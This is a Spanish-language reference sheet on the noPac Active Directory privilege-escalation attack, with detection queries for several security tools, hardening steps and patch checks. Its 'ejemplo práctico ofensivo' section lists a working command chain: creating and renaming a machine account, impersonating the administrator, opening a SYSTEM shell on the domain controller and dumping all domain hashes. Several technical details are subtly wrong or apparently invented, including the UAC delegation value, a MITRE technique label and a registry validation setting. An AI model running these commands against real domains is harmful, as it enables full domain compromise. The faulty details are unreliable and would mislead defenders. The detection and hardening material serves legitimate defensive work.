# 🛑 noPac en Active Directory

---

## 📝 ¿Qué es noPac?

| Concepto      | Descripción                                                                                                      |
|---------------|-----------------------------------------------------------------------------------------------------------------|
| **Definición**| Combinación de dos fallos (CVE-2021-42278 y CVE-2021-42287) que permite a cualquier usuario del dominio crear y manipular cuentas de máquina para suplantar a un DC y obtener privilegios de administrador. |
| **Requisito** | MachineAccountQuota > 0 (por defecto 10) y DCs sin parches críticos de noviembre/diciembre 2021 o posteriores.    |

---

## 🛠️ ¿Cómo funciona el ataque?

| Fase                | Acción                                                                                                 |
|---------------------|--------------------------------------------------------------------------------------------------------|
| **Creación**        | El atacante, con una cuenta cualquiera, crea una cuenta de máquina nueva en el dominio.                |
| **Manipulación**    | Cambia el nombre/SAMAccountName de la máquina para imitar un DC, o modifica una existente poco vigilada.|
| **Ticket Kerberos** | Solicita TGT/TGS como esa máquina, engañando al KDC y obteniendo privilegios de administrador de dominio. |
| **Explotación**     | Usa el ticket para ejecutar comandos como SYSTEM, abrir shells remotas y extraer hashes desde el DC.    |
| **Limpieza**        | Borra la cuenta de máquina para eliminar huellas.                                                      |

---

## 💻 Ejemplo práctico ofensivo (comandos reales)

```bash
# Crear cuenta de máquina y cambiar atributos (nombre de DC)
python3 nopac.py --action addcomputer --computer-name FAKE-DC$ --computer-pass 'Password123!'
python3 nopac.py --action modcomputer --computer-name FAKE-DC$ --newname DC01$

# O modificar una cuenta de máquina existente ya creada:
python3 nopac.py --action modcomputer --computer-name EXISTENTE$ --newname DC01$

# Solicitar TGT como DC comprometido
getST.py -dc-ip 192.168.1.10 ESSOS.LOCAL/DC01\$ -impersonate administrator

# Obtener shell como SYSTEM directamente en el DC
psexec.py -k -no-pass ESSOS.LOCAL/administrator@dc01.essos.local

# Volcar hashes de todo el dominio
secretsdump.py -k -no-pass ESSOS.LOCAL/administrator@dc01.essos.local

# Muchos scripts permiten --dump, --shell, etc., para automatizar el proceso
```

---

## 📊 Detección en Splunk

| Evento clave | Descripción                                                                              |
|--------------|-----------------------------------------------------------------------------------------|
| **4741**     | Creación de cuenta de máquina (MachineAccountQuota abuse/noPac)                         |
| **4742**     | Modificación de cuenta de máquina (nombre, contraseña, atributos) - **¡CRÍTICO si UAC cambia a 0x2080 (delegación)!** |
| **4743**     | Borrado de cuenta de máquina (limpieza)                                                 |
| **4768/4769**| Solicitud de TGT/TGS Kerberos con la cuenta comprometida (suplantación, abuso tickets)  |
| **4624**     | Inicio de sesión (tipo 3/red) usando la máquina falsa                                   |
| **7045**     | Creación de servicio remoto (psexec/smbexec, shell persistente)                         |
| **5140**     | Acceso a recursos compartidos (ADMIN$, SYSVOL)                                          |
| **4662**     | Cambios en objetos críticos de AD (delegaciones, atributos avanzados)                   |
| **4738**     | Cambios en cuentas de usuario (si se toca una cuenta de máquina ya existente)           |

### Query Splunk básica

```splunk
index=dc_logs (EventCode=4741 OR EventCode=4742 OR EventCode=4743 OR EventCode=4768 OR EventCode=4769 OR EventCode=4624 OR EventCode=7045 OR EventCode=5140 OR EventCode=4662 OR EventCode=4738)
| sort _time
| table _time, EventCode, TargetAccountName, SubjectAccountName, host, Client_Address
```

### Cambios en cuentas de máquina existentes

```splunk
index=dc_logs EventCode=4742
| search AttributeName="sAMAccountName" OR AttributeName="servicePrincipalName" OR AttributeName="userAccountControl"
| table _time, TargetAccountName, SubjectAccountName, AttributeName, OldValue, NewValue, host
```

### Detección crítica: Delegación no restringida habilitada (Event 4742)

```splunk
index=dc_logs EventCode=4742
| search Message="*New UAC Value: 0x2080*" OR Message="*Trusted For Delegation*"
| table _time, TargetAccountName, SubjectAccountName, Message
| eval AlertType="CRITICAL - Unconstrained Delegation Enabled"
| eval Technique="T1098.002 - Account Manipulation: Additional Cloud Credentials"
```

> **⚠️ DIFERENCIACIÓN**: Event 4742 con cambio UAC a 0x2080 indica **delegación no restringida** habilitada, NO un ataque noPac. Requiere investigación inmediata por riesgo de compromiso total del dominio.

### Detección de shell/dump vía creación de servicio y acceso a NTDS.dit

```splunk
index=dc_logs (EventCode=7045 OR EventCode=5140)
| search (ServiceFileName="*cmd.exe*" OR ServiceFileName="*powershell.exe*" OR Object_Name="*NTDS.dit*")
| table _time, EventCode, ServiceFileName, Object_Name, SubjectAccountName, host
```

---

## 🛡️ Detección con Windows Defender for Endpoint

### Reglas de detección personalizadas

```kql
// noPac - Detección de modificaciones sospechosas en sAMAccountName
DeviceEvents
| where ActionType == "LdapModify"
| where AdditionalFields has "sAMAccountName"
| where AdditionalFields has "$" and AdditionalFields has_any ("DC01", "DC02", "CONTROLLER")
| project Timestamp, DeviceName, AccountName, AdditionalFields
| order by Timestamp desc
```

```kql
// Detección de herramientas noPac conocidas
DeviceProcessEvents
| where ProcessCommandLine has_any ("noPac", "sam-the-admin", "CVE-2021-42278", "CVE-2021-42287")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```

```kql
// Detección de cambios rápidos en nombres de cuenta de máquina
DeviceEvents
| where ActionType == "UserAccountModified"
| where AccountName endswith "$"
| where AdditionalFields has "sAMAccountName"
| summarize Changes = count() by AccountName, bin(Timestamp, 5m)
| where Changes > 2
| order by Changes desc
```

### Alertas recomendadas

| Regla | Descripción | Severidad |
|-------|-------------|-----------|
| **Suspicious sAMAccountName Change** | Modificación sospechosa del atributo sAMAccountName | Alta |
| **noPac Exploitation Tools** | Detección de herramientas de explotación noPac | Crítica |
| **Rapid Account Name Changes** | Cambios rápidos en nombres de cuentas de máquina | Media |

---

## 🦅 Detección con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Detección de noPac basado en modificaciones de cuentas
event_platform=Win event_simpleName=UserAccountModified
| search UserName=*$ ModifiedAttribute=sAMAccountName
| table _time, ComputerName, UserName, ModifiedAttribute, NewValue, OldValue
| sort - _time
```

```sql
-- Detección de herramientas noPac
event_platform=Win event_simpleName=ProcessRollup2 
| search (CommandLine=*noPac* OR CommandLine=*sam-the-admin* OR CommandLine=*CVE-2021-42278*)
| table _time, ComputerName, UserName, FileName, CommandLine, SHA256HashData
| sort - _time
```

```sql
-- Detección de solicitudes TGT con nombres duplicados
event_platform=Win event_simpleName=AuthActivityAuditLog
| search ServiceName=krbtgt UserName=*$
| bin _time span=1m
| stats count as tgt_requests, values(UserName) as account_names by ComputerName, _time
| where tgt_requests > 5
| sort - tgt_requests
```

### Custom IOAs (Indicators of Attack)

```sql
-- IOA para detectar patrones noPac
event_platform=Win event_simpleName=LdapSearch
| search SearchFilter=*sAMAccountName* SearchFilter=*DC*
| stats count by ComputerName, UserName, SearchFilter
| where count > 5
```

---

## 🔍 Queries KQL para Microsoft Sentinel

### Detección de noPac

```kql
// Query principal para detectar explotación noPac
SecurityEvent
| where EventID == 4738 // User account changed
| where TargetUserName endswith "$"
| where TargetUserName has_any ("DC", "CONTROLLER", "DOMAIN")
| project TimeGenerated, Computer, TargetUserName, SubjectUserName, SamAccountName
| order by TimeGenerated desc
```

```kql
// Correlación con herramientas de explotación
DeviceProcessEvents
| where ProcessCommandLine has_any ("noPac", "sam-the-admin", "CVE-2021-42278")
| join kind=inner (
    SecurityEvent
    | where EventID == 4738 and TargetUserName endswith "$"
    | project TimeGenerated, Computer, TargetUserName, SubjectUserName
) on $left.DeviceName == $right.Computer
| project TimeGenerated, DeviceName, ProcessCommandLine, TargetUserName
```

### Hunting avanzado

```kql
// Detección de secuencia completa noPac
SecurityEvent
| where EventID == 4741 // Computer account created
| join kind=inner (
    SecurityEvent
    | where EventID == 4738 // Account changed
    | where TargetUserName endswith "$"
    | project TimeGenerated, Computer, TargetUserName, SamAccountName
) on $left.NewTargetUserName == $right.TargetUserName
| where TimeGenerated1 > TimeGenerated and TimeGenerated1 - TimeGenerated < 10m
| join kind=inner (
    SecurityEvent
    | where EventID == 4768 // TGT requested
    | where TargetUserName endswith "$"
    | project TimeGenerated, Computer, TargetUserName, ServiceName
) on $left.TargetUserName == $right.TargetUserName
| where TimeGenerated2 > TimeGenerated1 and TimeGenerated2 - TimeGenerated1 < 5m
| project TimeGenerated, Computer, NewTargetUserName, SamAccountName, ServiceName
```

```kql
// Detección de tickets TGT con nombres sospechosos
SecurityEvent
| where EventID == 4768 // TGT requested
| where TargetUserName endswith "$" and TargetUserName has_any ("DC", "CONTROLLER", "ADMIN")
| where TargetUserName != Computer + "$"
| project TimeGenerated, Computer, TargetUserName, IpAddress, ServiceName
| order by TimeGenerated desc
```

---

## 🦾 Hardening y mitigación

| Medida                                  | Descripción                                                                                      |
|------------------------------------------|-------------------------------------------------------------------------------------------------|
| **MachineAccountQuota = 0**              | Solo los administradores pueden crear cuentas de máquina.                                        |
| **Parchear DCs**                         | Aplica todas las actualizaciones acumulativas desde nov/dic 2021 (CVE-2021-42278 y 42287).       |
| **Alerta por secuencia completa**        | No solo un evento: correlaciona creación, modificación y uso de cuentas de máquina.              |
| **Honeytokens de máquina**               | Crea cuentas de máquina trampa y alerta si se usan.                                              |
| **Monitoriza cambios en cuentas existentes** | Detecta 4742 sobre cuentas de máquina antiguas o poco usadas.                                   |
| **Auditoría avanzada y logs grandes**    | Habilita directivas de auditoría avanzada y sube el tamaño del log de seguridad.                 |
| **Permisos de delegación restringidos**  | No uses “Permitir delegación a cualquier servicio”. Segmenta y revisa delegaciones periódicamente.|
| **Monitoriza cambios en msDS-AllowedToActOnBehalfOfOtherIdentity** | Detección avanzada de persistencia oculta.                                     |
| **Auditoría de scripts y binarios en ADMIN$** | Alerta si aparece un ejecutable no estándar en recursos compartidos administrativos.             |
| **Restricción temporal**                 | Alerta si un 4742 ocurre fuera de horario laboral.                                               |

---

## 🚨 Respuesta ante incidentes

1. **Aísla inmediatamente cualquier máquina donde veas la secuencia 4742 (sobre cuenta antigua) + 7045/5140.**
2. **Revoca tickets Kerberos** y resetea la contraseña de la cuenta de máquina afectada.
3. **Forense de servicios creados y binarios ejecutados en las últimas horas.**
4. **Analiza cambios de atributos en cuentas de máquina en logs históricos (búsqueda retroactiva).**
5. **Despliega reglas de detección en tiempo real para cambios de atributos clave.**

---

## 🔧 Parches y actualizaciones

| Parche/Update | Descripción                                                                                  |
|---------------|----------------------------------------------------------------------------------------------|
| **KB5008102** | Windows 11/10/Server - Parche CRÍTICO para CVE-2021-42278/42287 (noPac exploit principal). |
| **KB5007247** | Windows Server 2022 - Correcciones adicionales para validaciones de sAMAccountName.        |
| **KB5007206** | Windows Server 2019 - Fortalecimiento de validaciones KDC contra spoofing de nombres.      |
| **KB5007192** | Windows Server 2016 - Parches esenciales para prevenir escalada de privilegios noPac.      |
| **KB5007205** | Windows Server 2012 R2 - Correcciones críticas de seguridad para dominios legacy.         |
| **Domain/Forest Level** | Actualizar niveles funcionales para mejores validaciones de seguridad.        |

### Configuraciones de registro críticas post-parche

```powershell
# Habilitar auditoría detallada de cambios en cuentas de equipo
auditpol /set /subcategory:"Computer Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable

# Configurar logging extendido para cambios de atributos críticos
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "AuditSpecialGroups" -Value 1

# Validación de nombres de cuenta reforzada
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "StrictSAMAccountNameValidation" -Value 1
```

### Validación crítica post-parche

```powershell
# Script para verificar que el parche principal esté aplicado
$noPacPatch = Get-HotFix -Id "KB5008102" -ErrorAction SilentlyContinue
if ($noPacPatch) {
    Write-Host "✓ KB5008102 (noPac fix) aplicado el: $($noPacPatch.InstalledOn)" -ForegroundColor Green
} else {
    Write-Host "✗ CRÍTICO: KB5008102 NO aplicado - Sistema vulnerable a noPac" -ForegroundColor Red
}

# Verificar configuraciones de validación
$validation = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "StrictSAMAccountNameValidation" -ErrorAction SilentlyContinue
if ($validation.StrictSAMAccountNameValidation -eq 1) {
    Write-Host "✓ Validación de nombres SAM configurada correctamente" -ForegroundColor Green
} else {
    Write-Host "⚠ Configurar validación estricta de nombres SAM" -ForegroundColor Yellow
}
```

### Configuraciones de GPO recomendadas

```powershell
# Restringir privilegios de modificación de cuentas de equipo
# Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\User Rights Assignment
# "Add workstations to domain" - Solo administradores específicos

# Configurar políticas de nombres de equipo más restrictivas
Set-ADDefaultDomainPasswordPolicy -Identity "Default Domain Policy" -ComplexityEnabled $true
```

### Actualizaciones críticas relacionadas

- **CVE-2021-42278**: sAMAccountName spoofing (noPac principal) - KB5008102
- **CVE-2021-42287**: KDC bypass de validaciones - KB5008102
- **CVE-2022-26923**: Certificados AD relacionados con autenticación de máquinas - KB5014754
- **CVE-2020-17049**: Vulnerabilidad Kerberos KDC - KB4586876

### Herramientas de detección específicas para noPac

```powershell
# Script para detectar intentos de noPac en tiempo real
$events = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4742,4743} -MaxEvents 50
$events | Where-Object {$_.Message -like "*sAMAccountName*" -and $_.Message -like "*$*"} | 
ForEach-Object {
    Write-Warning "Posible intento noPac detectado: $($_.TimeCreated) - $($_.Message.Substring(0,100))"
}

# Monitorear cambios en cuentas de equipo con nombres sospechosos
Get-ADComputer -Filter "Name -like '*$*'" -Properties whenChanged | 
Where-Object {$_.whenChanged -gt (Get-Date).AddHours(-24)} |
Select-Object Name, whenChanged, DistinguishedName
```

---

## 📚 Referencias

- [noPac - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privilege-escalation/nopac)
- [Microsoft Security Update Guide](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
- [Impacket](https://github.com/fortra/impacket)

